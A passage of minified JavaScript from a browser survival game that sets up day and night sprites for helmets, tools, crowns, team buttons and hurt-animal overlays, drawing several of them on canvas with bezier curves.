      sprite[Ie.EMERALD_MACHINE_GROUND][Ie.DAY] = IMAGES.EMERALD_MACHINE_GROUNDD;
      sprite[Ie.EMERALD_MACHINE_GROUND][Ie.NIGHT] = IMAGES.EMERALD_MACHINE_GROUNDN;
      sprite[Ie.EMERALD_MACHINE_HOLE] = [];
      sprite[Ie.EMERALD_MACHINE_HOLE][Ie.DAY] = IMAGES.EMERALD_MACHINE_HOLED;
      sprite[Ie.EMERALD_MACHINE_HOLE][Ie.NIGHT] = IMAGES.EMERALD_MACHINE_HOLEN;
      sprite[Ie.EMERALD_MACHINE_ROTATE] = [];
      sprite[Ie.EMERALD_MACHINE_ROTATE][Ie.DAY] = IMAGES.EMERALD_MACHINE_ROTATED;
      sprite[Ie.EMERALD_MACHINE_ROTATE][Ie.NIGHT] = IMAGES.EMERALD_MACHINE_ROTATEN;
      sprite[Ie.EMERALD_MACHINE] = [];
      sprite[Ie.EMERALD_MACHINE][Ie.DAY] = IMAGES.EMERALD_MACHINED;
      sprite[Ie.EMERALD_MACHINE][Ie.NIGHT] = IMAGES.EMERALD_MACHINEN;
      sprite[Ie.EXTRACTOR_MACHINE0_STONE] = [];
      sprite[Ie.EXTRACTOR_MACHINE0_STONE][Ie.DAY] = IMAGES.EXTRACTOR_MACHINE0_STONED;
      sprite[Ie.EXTRACTOR_MACHINE0_STONE][Ie.NIGHT] = IMAGES.EXTRACTOR_MACHINE0_STONEN;
      sprite[Ie.EXTRACTOR_MACHINE_STONE] = [];
      sprite[Ie.EXTRACTOR_MACHINE_STONE][Ie.DAY] = IMAGES.EXTRACTOR_MACHINE_STONED;
      sprite[Ie.EXTRACTOR_MACHINE_STONE][Ie.NIGHT] = IMAGES.EXTRACTOR_MACHINE_STONEN;
      sprite[Ie.EXTRACTOR_MACHINE0_GOLD] = [];
      sprite[Ie.EXTRACTOR_MACHINE0_GOLD][Ie.DAY] = IMAGES.EXTRACTOR_MACHINE0_GOLDD;
      sprite[Ie.EXTRACTOR_MACHINE0_GOLD][Ie.NIGHT] = IMAGES.EXTRACTOR_MACHINE0_GOLDN;
      sprite[Ie.EXTRACTOR_MACHINE_GOLD] = [];
      sprite[Ie.EXTRACTOR_MACHINE_GOLD][Ie.DAY] = IMAGES.EXTRACTOR_MACHINE_GOLDD;
      sprite[Ie.EXTRACTOR_MACHINE_GOLD][Ie.NIGHT] = IMAGES.EXTRACTOR_MACHINE_GOLDN;
      sprite[Ie.EXTRACTOR_MACHINE0_DIAMOND] = [];
      sprite[Ie.EXTRACTOR_MACHINE0_DIAMOND][Ie.DAY] = IMAGES.EXTRACTOR_MACHINE0_DIAMONDD;
      sprite[Ie.EXTRACTOR_MACHINE0_DIAMOND][Ie.NIGHT] = IMAGES.EXTRACTOR_MACHINE0_DIAMONDN;
      sprite[Ie.EXTRACTOR_MACHINE_DIAMOND] = [];
      sprite[Ie.EXTRACTOR_MACHINE_DIAMOND][Ie.DAY] = IMAGES.EXTRACTOR_MACHINE_DIAMONDD;
      sprite[Ie.EXTRACTOR_MACHINE_DIAMOND][Ie.NIGHT] = IMAGES.EXTRACTOR_MACHINE_DIAMONDN;
      sprite[Ie.EXTRACTOR_MACHINE0_AMETHYST] = [];
      sprite[Ie.EXTRACTOR_MACHINE0_AMETHYST][Ie.DAY] = IMAGES.EXTRACTOR_MACHINE0_AMETHYSTD;
      sprite[Ie.EXTRACTOR_MACHINE0_AMETHYST][Ie.NIGHT] = IMAGES.EXTRACTOR_MACHINE0_AMETHYSTN;
      sprite[Ie.EXTRACTOR_MACHINE_AMETHYST] = [];
      sprite[Ie.EXTRACTOR_MACHINE_AMETHYST][Ie.DAY] = IMAGES.EXTRACTOR_MACHINE_AMETHYSTD;
      sprite[Ie.EXTRACTOR_MACHINE_AMETHYST][Ie.NIGHT] = IMAGES.EXTRACTOR_MACHINE_AMETHYSTN;
      sprite[Ie.EXTRACTOR_MACHINE0_REIDITE] = [];
      sprite[Ie.EXTRACTOR_MACHINE0_REIDITE][Ie.DAY] = IMAGES.EXTRACTOR_MACHINE0_REIDITED;
      sprite[Ie.EXTRACTOR_MACHINE0_REIDITE][Ie.NIGHT] = IMAGES.EXTRACTOR_MACHINE0_REIDITEN;
      sprite[Ie.EXTRACTOR_MACHINE_REIDITE] = [];
      sprite[Ie.EXTRACTOR_MACHINE_REIDITE][Ie.DAY] = IMAGES.EXTRACTOR_MACHINE_REIDITED;
      sprite[Ie.EXTRACTOR_MACHINE_REIDITE][Ie.NIGHT] = IMAGES.EXTRACTOR_MACHINE_REIDITEN;
      sprite[Ie.FIREFLY] = [];
      sprite[Ie.FIREFLY][Ie.DAY] = IMAGES.FIREFLYD;
      sprite[Ie.FIREFLY][Ie.NIGHT] = IMAGES.FIREFLYN;
      sprite[Ie.HURT_FIREFLY] = IMAGES.HURT_FIREFLY;
      sprite[Ie.TOTEM] = [];
      sprite[Ie.TOTEM][Ie.DAY] = te(mr(0.75, true, ["#0d1b1c", "#4c3a15", "#634828", "#564021"]));
      sprite[Ie.TOTEM][Ie.NIGHT] = te(mr(0.75, true, ["#030d14", "#0d2e33", "#184747", "#123b3f"]));
      sprite[Ie.ICON_MEMBER] = te(Sr(0.3, ["#092813", "#1f773d"], 0));
      sprite[Ie.ICON_LEADER] = te(Sr(0.3, ["#092813", "#1f773d"], 1));
      sprite[Ie.VERIFIED] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 60;
        t.height = e * 60;
        r.translate(e * -25, e * -25);
        r.translate(0, e * 5);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 24, e * 50);
        r.bezierCurveTo(e * 32.5, e * 54.5, e * 32.5, e * 54.5, e * 41, e * 59);
        r.bezierCurveTo(e * 57, e * 47, e * 57, e * 47, e * 73, e * 35);
        r.bezierCurveTo(e * 57, e * 53, e * 57, e * 53, e * 41, e * 71);
        r.closePath();
        ye(r, i[0]);
        r.translate(0, e * -5);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 24, e * 50);
        r.bezierCurveTo(e * 32.5, e * 54.5, e * 32.5, e * 54.5, e * 41, e * 59);
        r.bezierCurveTo(e * 57, e * 47, e * 57, e * 47, e * 73, e * 35);
        r.bezierCurveTo(e * 57, e * 53, e * 57, e * 53, e * 41, e * 71);
        r.closePath();
        ye(r, i[1]);
        return t;
      }(0.6, ["#092813", "#1f773d"]));
      sprite[Ie.TEAM_BUTTON] = [];
      sprite[Ie.TEAM_BUTTON].push(te(pr(0.7, ["#092813", "#1f773d", "#165b2b", "#4c3a15", "#1f773d"], 0)));
      sprite[Ie.TEAM_BUTTON].push(te(pr(0.7, ["#0b3719", "#228745", "#1a7034", "#614a1a", "#238845"], 0)));
      sprite[Ie.TEAM_BUTTON].push(te(pr(0.7, ["#092a14", "#186733", "#124a23", "#4c3a15", "#1b6735"], 0)));
      sprite[Ie.FULL_TEAM_BUTTON] = [];
      var t = te(pr(0.7, ["#280e09", "#77371f", "#280e09", "#2e2410", "#77371f"], 0));
      sprite[Ie.FULL_TEAM_BUTTON].push(t);
      sprite[Ie.FULL_TEAM_BUTTON].push(t);
      sprite[Ie.FULL_TEAM_BUTTON].push(t);
      sprite[Ie.MANAGE_TEAM_BUTTON] = [];
      sprite[Ie.MANAGE_TEAM_BUTTON].push(te(pr(0.7, ["#092813", "#1f773d", "#165b2b", "#4c3a15", "#1f773d"], 1)));
      sprite[Ie.MANAGE_TEAM_BUTTON].push(te(pr(0.7, ["#0b3719", "#228745", "#1a7034", "#614a1a", "#238845"], 1)));
      sprite[Ie.MANAGE_TEAM_BUTTON].push(te(pr(0.7, ["#092a14", "#186733", "#124a23", "#4c3a15", "#1b6735"], 1)));
      sprite[Ie.DELAY_SPIKE] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        var n = e * 170;
        var a = e * 172;
        var o = n / 2;
        var s = a / 2;
        t.width = n;
        t.height = a;
        r.translate(o, s);
        r.save();
        for (var _ = 0; _ < 10; _++) {
          r.rotate(Math.PI / 5);
          r.save();
          r.translate(e * 65, 0);
          Ve(r, 3, e * 18, e * 4);
          ye(r, i[0]);
          r.restore();
        }
        r.restore();
        ze(r, 0, 0, e * 40);
        ye(r, undefined, i[0], e * 6);
        ze(r, 0, 0, e * 20);
        ye(r, i[0]);
        return t;
      }(0.3, ["#FFFFFF"]));
      sprite[Ie.DELAY_WALL] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        var n = e * 130;
        var a = e * 142;
        var o = n / 2;
        var s = a / 2;
        t.width = n;
        t.height = a;
        ze(r, o, s, e * 40);
        ye(r, undefined, i[0], e * 7);
        ze(r, o, s, e * 30);
        ye(r, undefined, i[0], e * 7);
        ze(r, o, s, e * 20);
        ye(r, i[0]);
        return t;
      }(0.3, ["#FFFFFF"]));
      sprite[Ie.DELAY_TEAM] = te(Sr(0.4, ["rgba(255, 255, 255, 0)", "#FFFFFF"], 0));
      sprite[Ie.DELAY_DRINK] = te(we(Math.PI / 5, function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 316;
        t.height = e * 365;
        r.save();
        r.translate(e * 156.07142639160156, e * 51.81248474121094);
        r.rotate(0);
        Be(r, e * -21.5, e * -34, e * 43, e * 68, e * 8);
        r.restore();
        ye(r, i[0], i[0], e * 15);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 126.57142639160156, e * 67.38392639160156);
        r.bezierCurveTo(e * 126.57142639160156, e * 57.38392639160156, e * 132.57142639160156, e * 54.38392639160156, e * 140.57142639160156, e * 54.38392639160156);
        r.bezierCurveTo(e * 177.57142639160156, e * 55.38392639160156, e * 158.07142639160156, e * 54.38392639160156, e * 175.57142639160156, e * 54.38392639160156);
        r.bezierCurveTo(e * 185.57142639160156, e * 56.38392639160156, e * 185.57142639160156, e * 57.38392639160156, e * 184.57142639160156, e * 66.38392639160156);
        r.bezierCurveTo(e * 184.57142639160156, e * 78.38392639160156, e * 184.57142639160156, e * 89.38392639160156, e * 184.57142639160156, e * 90.38392639160156);
        r.bezierCurveTo(e * 177.57142639160156, e * 107.38392639160156, e * 180.57142639160156, e * 112.38392639160156, e * 189.57142639160156, e * 116.38392639160156);
        r.bezierCurveTo(e * 212.57142639160156, e * 127.38392639160156, e * 212.57142639160156, e * 132.38392639160156, e * 211.57142639160156, e * 150.38392639160156);
        r.bezierCurveTo(e * 211.57142639160156, e * 227.59821128845215, e * 211.57142639160156, e * 227.59821128845215, e * 211.57142639160156, e * 304.81249618530273);
        r.bezierCurveTo(e * 212.57142639160156, e * 328.81249618530273, e * 209.57142639160156, e * 330.81249618530273, e * 188.57142639160156, e * 333.81249618530273);
        r.bezierCurveTo(e * 155.07142639160156, e * 333.31249618530273, e * 155.07142639160156, e * 333.31249618530273, e * 121.57142639160156, e * 332.81249618530273);
        r.bezierCurveTo(e * 104.57142639160156, e * 327.81249618530273, e * 105.57142639160156, e * 328.81249618530273, e * 104.57142639160156, e * 312.81249618530273);
        r.bezierCurveTo(e * 104.57142639160156, e * 228.16963958740234, e * 104.57142639160156, e * 228.16963958740234, e * 104.57142639160156, e * 143.52678298950195);
        r.bezierCurveTo(e * 106.57142639160156, e * 124.52678298950195, e * 110.57142639160156, e * 123.52678298950195, e * 123.57142639160156, e * 116.52678298950195);
        r.bezierCurveTo(e * 136.57142639160156, e * 110.52678298950195, e * 130.57142639160156, e * 106.52678298950195, e * 126.57142639160156, e * 98.52678298950195);
        r.closePath();
        ye(r, i[0], i[0], e * 15);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 125.57142639160156, e * 156.66963958740234);
        r.bezierCurveTo(e * 125.57142639160156, e * 182.66963958740234, e * 125.57142639160156, e * 182.66963958740234, e * 125.57142639160156, e * 208.66963958740234);
        r.closePath();
        ye(r, i[0], i[0], e * 15);
        return t;
      }(0.2, ["#FFFFFF"])));
      sprite[Ie.AMETHYST_HELMET] = [];
      sprite[Ie.AMETHYST_HELMET][Ie.DAY] = te(gr(0.85, 0, ["#0d1b1c", "#8c55b7", "#652d8e", "#79359e", "#5eccd1", "#4badad", "#9e6ac6"]));
      sprite[Ie.AMETHYST_HELMET][Ie.NIGHT] = te(gr(0.85, 0, ["#0d1b1c", "#4e4e93", "#393977", "#444187", "#2b9390", "#277a74", "#7da8db"]));
      sprite[Ie.SHOW_TEAM_BUTTON] = [];
      sprite[Ie.SHOW_TEAM_BUTTON].push(te(pr(0.7, ["#280e09", "#77371f", "#280e09", "#2e2410", "#77371f"], 1)));
      sprite[Ie.SHOW_TEAM_BUTTON].push(te(pr(0.7, ["#38130C", "#853D22", "#391402", "#3D3016", "#873E22"], 1)));
      sprite[Ie.SHOW_TEAM_BUTTON].push(te(pr(0.7, ["#1C0A06", "#6B3019", "#1D0A06", "#251D0C", "#6A301A"], 1)));
      sprite[Ie.HOOD] = [];
      sprite[Ie.HOOD][Ie.DAY] = te(tn(0.37, 0, ["#2a2938", "#242330", "#313041"]));
      sprite[Ie.HOOD][Ie.NIGHT] = te(tn(0.37, 0, ["#1b1e30", "#161921", "#252f3e"]));
      sprite[Ie.WINTER_HOOD] = [];
      sprite[Ie.WINTER_HOOD][Ie.DAY] = te(rn(0.17, 0, ["#2a2938", "#242330", "#313041", "#1b1a25", "#d62c0e"]));
      sprite[Ie.WINTER_HOOD][Ie.NIGHT] = te(rn(0.17, 0, ["#1b1e30", "#161921", "#252f3e", "#0a0c11", "#d62c0e"]));
      sprite[Ie.WINTER_PEASANT] = [];
      sprite[Ie.WINTER_PEASANT][Ie.DAY] = te(nn(0.55, true, ["#1d1d22", "#e2e1e1", "#d2cbcb", "#cfcbc8", "#beb5b5", "#ada0a0"], 1));
      sprite[Ie.WINTER_PEASANT][Ie.NIGHT] = te(nn(0.55, true, ["#1d1d22", "#216661", "#134945", "#2b8079", "#17504c"], 1));
      sprite[Ie.PEASANT] = [];
      sprite[Ie.PEASANT][Ie.DAY] = te(nn(0.55, true, ["#1d1d22", "#8c7654", "#785f4c", "#a88e6c", "#785f4c", "#705845"], 0));
      sprite[Ie.PEASANT][Ie.NIGHT] = te(nn(0.55, true, ["#1d1d22", "#1b5752", "#0e3b37", "#23706a", "#11413e", "#0b322f"], 0));
      sprite[Ie.CROWN_GREEN] = [];
      sprite[Ie.CROWN_GREEN][Ie.DAY] = te(cn(0.2, true, ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#49B669", "#19994C", "#71C187"]));
      sprite[Ie.CROWN_GREEN][Ie.NIGHT] = te(cn(0.2, true, ["#2b7c57", "#114933", "#1b6656", "#1a7961", "#3db76f", "#118254", "#40c696"]));
      sprite[Ie.CROWN_ORANGE] = [];
      sprite[Ie.CROWN_ORANGE][Ie.DAY] = te(cn(0.2, true, ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#C45727", "#994617", "#DB9358"]));
      sprite[Ie.CROWN_ORANGE][Ie.NIGHT] = te(cn(0.2, true, ["#2b7c57", "#114933", "#1b6656", "#1a7961", "#69b681", "#509a75", "#7ec387"]));
      sprite[Ie.CROWN_BLUE] = [];
      sprite[Ie.CROWN_BLUE][Ie.DAY] = te(cn(0.2, true, ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#2792C1", "#196599", "#59C0D8"]));
      sprite[Ie.CROWN_BLUE][Ie.NIGHT] = te(cn(0.2, true, ["#2b7c57", "#114933", "#1b6656", "#1a7961", "#19899e", "#16688b", "#4ea3c7"]));
      sprite[Ie.CROWN_CRAB] = [];
      sprite[Ie.CROWN_CRAB][Ie.DAY] = te(St(0.24, true, ["#000000", "#b03431", "#94312d", "#bd3c33", "#e45936"]));
      sprite[Ie.CROWN_CRAB][Ie.NIGHT] = te(St(0.24, true, ["#000000", "#1b103e", "#190f3b", "#261a4e", "#34255d"]));
      sprite[Ie.DRAGON_HELMET] = [];
      sprite[Ie.DRAGON_HELMET][Ie.DAY] = te(jt(0.32, 0, ["#0d1b1c", "#cae9eb", "#75bcae", "#ffffff", "#51736d", "#2b4d48", "#1b3a3a", "#80ccca", "#59ada7"]));
      sprite[Ie.DRAGON_HELMET][Ie.NIGHT] = te(jt(0.32, 0, ["#0d1b1c", "#70c1d6", "#49b2cf", "#87cad9", "#367c93", "#113743", "#0c2c36", "#51a2b8", "#3a8ea4"]));
      sprite[Ie.DRAGON_SWORD] = [];
      sprite[Ie.DRAGON_SWORD][Ie.DAY] = te(we(3, Br(0.9, true, ["#0d1b1c", "#284c4a", "#193533", "#c8efef", "#7eccbb"])));
      sprite[Ie.DRAGON_SWORD][Ie.NIGHT] = te(we(3, Br(0.9, true, ["#0d1b1c", "#18332e", "#112320", "#87d2e6", "#49b2cf"])));
      sprite[Ie.DRAGON_SWORD_HALO] = [];
      sprite[Ie.DRAGON_SWORD_HALO][Ie.DAY] = te(we(3, Br(1, true, [undefined, undefined, undefined, "#c8efef", "#c8efef"])));
      sprite[Ie.DRAGON_SWORD_HALO][Ie.NIGHT] = te(we(3, Br(1, true, [undefined, undefined, undefined, "#87d2e6", "#87d2e6"])));
      sprite[Ie.QUEST_BUTTON] = [];
      sprite[Ie.QUEST_BUTTON].push(te(In(0.3, 0, ["#0d1b1c", "#392C16", "#5E3E1A", "#704821", "#654320", "#eda80d"], 0)));
      sprite[Ie.QUEST_BUTTON].push(te(In(0.3, 0, ["#0d1b1c", "#392C16", "#5E3E1A", "#704821", "#654320", "#eda80d"], 1)));
      sprite[Ie.QUEST_BUTTON].push(te(In(0.3, 0, ["#0d1b1c", "#392C16", "#5E3E1A", "#704821", "#654320", "#d7990c"], 1)));
      sprite[Ie.MARKET_BUTTON] = [];
      sprite[Ie.MARKET_BUTTON].push(te(un(0.7, ["#392C16", "#5E3E1A", "#85592c", "#eda80d"], 0)));
      sprite[Ie.MARKET_BUTTON].push(te(un(0.7, ["#392C16", "#5E3E1A", "#85592c", "#eda80d"], 1)));
      sprite[Ie.MARKET_BUTTON].push(te(un(0.7, ["#392C16", "#5E3E1A", "#85592c", "#eda80d"], 1)));
      sprite[Ie.SOUND_BUTTON_ON] = [];
      sprite[Ie.SOUND_BUTTON_ON].push(te(Li(0.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#eda80d"], 0, 1)));
      sprite[Ie.SOUND_BUTTON_ON].push(te(Li(0.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#eda80d"], 1, 1)));
      sprite[Ie.SOUND_BUTTON_ON].push(te(Li(0.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#d7990c"], 1, 1)));
      sprite[Ie.SOUND_BUTTON_OFF] = [];
      sprite[Ie.SOUND_BUTTON_OFF].push(te(Li(0.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#eda80d"], 0, 0)));
      sprite[Ie.SOUND_BUTTON_OFF].push(te(Li(0.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#eda80d"], 1, 0)));
      sprite[Ie.SOUND_BUTTON_OFF].push(te(Li(0.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#d7990c"], 1, 0)));
      sprite[Ie.SHOVEL] = [];
      sprite[Ie.SHOVEL][Ie.DAY] = te(we(3, Tn(0.7, true, ["#0d1b1c", "#6d5041", "#4f3d35", "#939393", "#5f6061", "#757575"])));
      sprite[Ie.SHOVEL][Ie.NIGHT] = te(we(3, Tn(0.7, true, ["#0d1b1c", "#0d2e33", "#0b2326", "#485e66", "#1f343f", "#274352"])));
      sprite[Ie.SHOVEL_GOLD] = [];
      sprite[Ie.SHOVEL_GOLD][Ie.DAY] = te(we(3, Tn(0.7, true, ["#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32", "#ada437"])));
      sprite[Ie.SHOVEL_GOLD][Ie.NIGHT] = te(we(3, Tn(0.7, true, ["#0d1b1c", "#263947", "#182935", "#43aa82", "#29997c", "#32916c"])));
      sprite[Ie.SHOVEL_DIAMOND] = [];
      sprite[Ie.SHOVEL_DIAMOND][Ie.DAY] = te(we(3, Tn(0.7, true, ["#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1", "#42aab8"])));
      sprite[Ie.SHOVEL_DIAMOND][Ie.NIGHT] = te(we(3, Tn(0.7, true, ["#0d1b1c", "#111316", "#0a0b0c", "#73dde5", "#3dc4c0", "#49bdc6"])));
      sprite[Ie.SHOVEL_AMETHYST] = [];
      sprite[Ie.SHOVEL_AMETHYST][Ie.DAY] = te(we(3, Tn(0.7, true, ["#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa", "#9641b5"])));
      sprite[Ie.SHOVEL_AMETHYST][Ie.NIGHT] = te(we(3, Tn(0.7, true, ["#0d1b1c", "#111316", "#0a0b0c", "#8359d3", "#764eb5", "#6f45c2"])));
      sprite[Ie.SHOP] = [];
      sprite[Ie.SHOP].push(te(zr(0.7, ["#3b330d", "#b5a118", "#c8ac16"])));
      sprite[Ie.SHOP].push(te(zr(0.7, ["#524712", "#c7b11c", "#d9ba18"])));
      sprite[Ie.SHOP].push(te(zr(0.7, ["#2a2409", "#9f8e14", "#ad9511"])));
      sprite[Ie.HURT_WOLF] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 188;
        t.height = e * 190;
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 33.00567626953125, e * 95.44320678710938);
        r.bezierCurveTo(e * 42.00567626953125, e * 87.44320678710938, e * 48.00567626953125, e * 51.443206787109375, e * 74.00567626953125, e * 47.443206787109375);
        r.bezierCurveTo(e * 100.00567626953125, e * 42.443206787109375, e * 118.00567626953125, e * 49.443206787109375, e * 131.00567626953125, e * 55.443206787109375);
        r.bezierCurveTo(e * 140.00567626953125, e * 70.44320678710938, e * 145.00567626953125, e * 87.44320678710938, e * 152.00567626953125, e * 94.44320678710938);
        r.bezierCurveTo(e * 149.00567626953125, e * 99.44320678710938, e * 147.00567626953125, e * 98.44320678710938, e * 141.00567626953125, e * 101.44320678710938);
        r.bezierCurveTo(e * 147.00567626953125, e * 108.44320678710938, e * 147.00567626953125, e * 111.44320678710938, e * 147.00567626953125, e * 112.44320678710938);
        r.bezierCurveTo(e * 143.00567626953125, e * 112.44320678710938, e * 141.00567626953125, e * 112.44320678710938, e * 137.00567626953125, e * 111.44320678710938);
        r.bezierCurveTo(e * 138.00567626953125, e * 117.44320678710938, e * 138.00567626953125, e * 120.44320678710938, e * 138.00567626953125, e * 124.44320678710938);
        r.bezierCurveTo(e * 125.00567626953125, e * 107.44320678710938, e * 121.00567626953125, e * 124.44320678710938, e * 110.00567626953125, e * 141.44320678710938);
        r.bezierCurveTo(e * 102.00567626953125, e * 158.44320678710938, e * 89.00567626953125, e * 158.44320678710938, e * 80.00567626953125, e * 144.44320678710938);
        r.bezierCurveTo(e * 61.00567626953125, e * 111.44320678710938, e * 56.00567626953125, e * 117.44320678710938, e * 48.00567626953125, e * 120.44320678710938);
        r.bezierCurveTo(e * 46.00567626953125, e * 118.44320678710938, e * 47.00567626953125, e * 112.44320678710938, e * 48.00567626953125, e * 107.44320678710938);
        r.bezierCurveTo(e * 43.00567626953125, e * 111.44320678710938, e * 40.00567626953125, e * 111.44320678710938, e * 37.00567626953125, e * 110.44320678710938);
        r.bezierCurveTo(e * 39.50567626953125, e * 104.94320678710938, e * 39.50567626953125, e * 104.94320678710938, e * 42.00567626953125, e * 99.44320678710938);
        r.bezierCurveTo(e * 33.00567626953125, e * 99.44320678710938, e * 33.00567626953125, e * 98.44320678710938, e * 33.00567626953125, e * 96.44320678710938);
        r.closePath();
        ye(r, i[0], i[0], e * 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 51.00567626953125, e * 72.53409576416016);
        r.bezierCurveTo(e * 48.00567626953125, e * 56.534095764160156, e * 48.00567626953125, e * 49.534095764160156, e * 54.00567626953125, e * 35.534095764160156);
        r.bezierCurveTo(e * 58.00567626953125, e * 26.534095764160156, e * 65.00567626953125, e * 27.534095764160156, e * 73.00567626953125, e * 40.534095764160156);
        r.bezierCurveTo(e * 81.00567626953125, e * 49.534095764160156, e * 82.00567626953125, e * 50.534095764160156, e * 83.00567626953125, e * 51.534095764160156);
        r.bezierCurveTo(e * 77.00567626953125, e * 71.53409576416016, e * 64.00567626953125, e * 75.53409576416016, e * 51.00567626953125, e * 72.53409576416016);
        r.closePath();
        ye(r, i[0], i[0], e * 2);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 105.00567626953125, e * 50.53410339355469);
        r.bezierCurveTo(e * 112.00567626953125, e * 48.53410339355469, e * 125.00567626953125, e * 21.534103393554688, e * 132.00567626953125, e * 33.53410339355469);
        r.bezierCurveTo(e * 138.00567626953125, e * 42.53410339355469, e * 140.00567626953125, e * 64.53410339355469, e * 136.00567626953125, e * 75.53410339355469);
        r.closePath();
        ye(r, i[0], i[0], e * 2);
        return t;
      }(1.1, ["#BB0000"]));
      sprite[Ie.HURT_SPIDER] = te(we(Math.PI, function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 238;
        t.height = e * 230;
        r.translate(e * -93, e * -110);
        ze(r, e * 213.5, e * 256.75, e * 75);
        ye(r, i);
        ze(r, e * 213.5, e * 175.75, e * 25);
        ye(r, i);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 156.5, e * 137.75);
        r.bezierCurveTo(e * 170.5, e * 173.75, e * 195.5, e * 177.75, e * 209.5, e * 177.75);
        r.lineWidth = e * 17;
        r.strokeStyle = i;
        r.stroke();
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 217.5, e * 178.75);
        r.bezierCurveTo(e * 251.5, e * 177.75, e * 263.5, e * 153.75, e * 270.5, e * 140.75);
        r.lineWidth = e * 17;
        r.strokeStyle = i;
        r.stroke();
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 130.5, e * 124.75);
        r.bezierCurveTo(e * 153.5, e * 185.75, e * 198.5, e * 185.75, e * 213.5, e * 185.75);
        r.lineWidth = e * 17;
        r.strokeStyle = i;
        r.stroke();
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 214.5, e * 183.75);
        r.bezierCurveTo(e * 265.5, e * 192.75, e * 293.5, e * 141.75, e * 297.5, e * 124.75);
        r.lineWidth = e * 17;
        r.strokeStyle = i;
        r.stroke();
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 107.5, e * 213.75);
        r.bezierCurveTo(e * 151.5, e * 190.75, e * 198.5, e * 184.75, e * 210.5, e * 184.75);
        r.lineWidth = e * 17;
        r.strokeStyle = i;
        r.stroke();
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 212.5, e * 187.75);
        r.bezierCurveTo(e * 258.5, e * 182.75, e * 286.5, e * 194.75, e * 314.5, e * 206.75);
        r.lineWidth = e * 17;
        r.strokeStyle = i;
        r.stroke();
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 102.5, e * 258.75);
        r.bezierCurveTo(e * 142.5, e * 200.75, e * 193.5, e * 194.75, e * 211.5, e * 185.75);
        r.lineWidth = e * 17;
        r.strokeStyle = i;
        r.stroke();
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 214.5, e * 192.75);
        r.bezierCurveTo(e * 276.5, e * 194.75, e * 306.5, e * 233.75, e * 316.5, e * 246.75);
        r.lineWidth = e * 17;
        r.strokeStyle = i;
        r.stroke();
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 219.5, e * 158.75);
        r.bezierCurveTo(e * 226.5, e * 159.75, e * 227.5, e * 147.75, e * 219.5, e * 145.75);
        r.closePath();
        r.lineWidth = e * 10;
        r.strokeStyle = i;
        r.stroke();
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 210.5, e * 160.75);
        r.bezierCurveTo(e * 203.5, e * 159.75, e * 199.5, e * 146.75, e * 210.5, e * 145.75);
        r.closePath();
        r.lineWidth = e * 10;
        r.strokeStyle = i;
        r.stroke();
        return t;
      }(0.9, "#BB0000")));
      sprite[Ie.EXPLORER_HAT] = [];
      sprite[Ie.EXPLORER_HAT][Ie.DAY] = te(ur(0.55, true, ["#c9a65f", "#ae863f", "#655530", "#4a391c", "#ebdd79", "#4a421c"]));
      sprite[Ie.EXPLORER_HAT][Ie.NIGHT] = te(ur(0.55, true, ["#15514f", "#0f3f3d", "#123335", "#0d2d2b", "#2b6664", "#070d16"]));
      sprite[Ie.WOOD_HELMET] = [];
      sprite[Ie.WOOD_HELMET][Ie.DAY] = te(lr(0.55, true, ["#252525", "#73583e", "#573f29", "#7d6144"]));
      sprite[Ie.WOOD_HELMET][Ie.NIGHT] = te(lr(0.55, true, ["#0d3b39", "#144642", "#0b3230", "#154f4b"]));
      sprite[Ie.STONE_HELMET] = [];
      sprite[Ie.STONE_HELMET][Ie.DAY] = te(Or(0.6, true, ["#252525", "#808080", "#4a4a4a", "#9e9c8b", "#615c53", "#686969", "#8a8776", "#555555", "#747474", "#969696", "#454545"]));
      sprite[Ie.STONE_HELMET][Ie.NIGHT] = te(Or(0.6, true, ["#030d14", "#1c4a4a", "#102d2d", "#255756", "#163d3c", "#194544", "#1f5252", "#184141", "#1c4a4a", "#255756", "#163a3a"]));
      sprite[Ie.GOLD_HELMET] = [];
